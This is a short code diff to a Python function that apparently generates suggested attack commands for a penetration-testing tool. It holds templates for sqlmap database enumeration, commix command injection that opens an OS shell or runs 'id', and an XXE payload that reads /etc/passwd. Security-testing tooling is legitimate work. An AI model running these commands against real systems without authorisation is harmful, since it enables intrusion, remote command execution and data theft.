@@ -64,7 +64,9 @@ def _attack_commands(scores: list[VectorScore], target: str, stack: dict) -> lis
             p_flag = f" -p {param}" if param else ""
             cmds.append(("SQLi", f"sqlmap -u \"{sig_url}\"{p_flag} --dbs --batch"))
         elif v == "CMDI":
-            cmds.append(("CMDI", f"# Test: curl \"{sig_url}\" — inject ;id or $(id) in param"))
+            p_flag = f" -p {param}" if param else ""
+            cmds.append(("CMDI", f"commix -u \"{sig_url}\"{p_flag} --os-shell\n"
+                                  f"  # one-shot: commix -u \"{sig_url}\"{p_flag} --os-cmd=id"))
         elif v == "XXE":
             cmds.append(("XXE", f"# Send XML with <!ENTITY xxe SYSTEM 'file:///etc/passwd'> to {sig_url}"))
         elif v == "UPLOAD":
